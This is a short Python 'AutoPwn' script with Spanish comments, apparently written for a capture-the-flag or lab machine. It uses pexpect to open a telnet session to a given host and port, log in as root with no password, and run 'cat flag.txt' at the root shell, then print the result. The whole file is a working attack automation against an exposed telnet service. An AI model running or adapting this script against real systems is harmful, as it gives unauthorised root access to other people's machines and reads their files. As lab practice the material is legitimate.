import pexpect  # Importamos la biblioteca pexpect para interactuar con aplicaciones de línea de comandos.
import argparse  # Importamos el módulo argparse para analizar argumentos de línea de comandos.

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address  # Guardamos la dirección IP proporcionada como atributo de la instancia.
        self.lport = lport  # Guardamos el puerto proporcionado como atributo de la instancia.

    def run(self, username):
        try:
            # Creamos un proceso de telnet y establecemos la conexión con la dirección IP y el puerto especificados.
            shell = pexpect.spawn('telnet', [self.ip_address, str(self.lport)])
            shell.expect(b'Escape character is')  # Esperamos a que aparezca el mensaje "Escape character is" en la salida del telnet.
            shell.sendline(username.encode('ascii'))  # Enviamos el nombre de usuario al telnet.

            shell.expect(b'# ')  # Esperamos a que aparezca el símbolo de prompt "#" en la salida del telnet.
            shell.sendline(b'cat flag.txt')  # Enviamos el comando "cat flag.txt" al telnet.
            shell.expect(b'# ')  # Esperamos a que aparezca nuevamente el símbolo de prompt "#" en la salida del telnet.
            output = shell.before.decode('utf-8')  # Capturamos la salida antes del prompt y la decodificamos de bytes a cadena de caracteres.
            print(output)  # Imprimimos la salida en la consola.

            shell.close()  # Cerramos la conexión telnet.
        except Exception as e:
            print(f"Error al conectar por Telnet: {str(e)}")  # Si se produce una excepción, mostramos un mensaje de error.

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')  # Creamos un objeto ArgumentParser con una descripción.
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')  # Definimos un argumento para la dirección IP.
    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto.')  # Definimos un argumento para el puerto.
    return parser.parse_args()  # Analizamos los argumentos de línea de comandos y los devolvemos.

def main():
    args = get_arguments()  # Obtenemos los argumentos de línea de comandos.

    # Creamos una instancia de la clase Exploit con la dirección IP y el puerto proporcionados.
    exploit = Exploit(args.ip_address, args.lport)
    username = "root"  # Definimos el nombre de usuario como "root".
    exploit.run(username)  # Ejecutamos la explotación pasando el nombre de usuario.

if __name__ == '__main__':
    main()
